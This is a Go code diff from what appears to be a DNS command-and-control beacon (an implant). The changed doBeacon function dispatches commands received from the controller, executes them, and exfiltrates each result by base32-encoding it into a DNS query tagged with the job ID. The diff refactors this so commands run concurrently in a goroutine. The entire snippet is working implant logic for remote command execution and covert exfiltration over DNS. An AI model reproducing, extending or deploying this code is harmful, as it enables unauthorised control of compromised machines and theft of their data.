@@ -79,10 +79,13 @@ func doBeacon(cfg *config.Config, cmdDispatcher map[string]commands.Command) {
 	commandArgs := commandSplit[2:]
 
 	if cmd, ok := cmdDispatcher[strings.ToLower(commandType)]; ok {
-		resultChan := cmd.Execute(commandArgs)
-		result := <-resultChan
-		dns.DnsQuery(encoding.Base32Encode(result) + "." + job)
+		go collectAndSendResult(cmd, commandArgs, job)
 	}
+}
+
+func collectAndSendResult(cmd commands.Command, commandArgs []string, job string){
+	result := cmd.Execute(commandArgs)
+	dns.DnsQuery(encoding.Base32Encode(result) + "." + job)
 }
 
 func initContext(cfg *config.Config) *config.Context {
@@ -91,5 +94,3 @@ func initContext(cfg *config.Config) *config.Context {
 		SetBeaconIntervalCh: make(chan int, 1),
 	}
 }
-
-
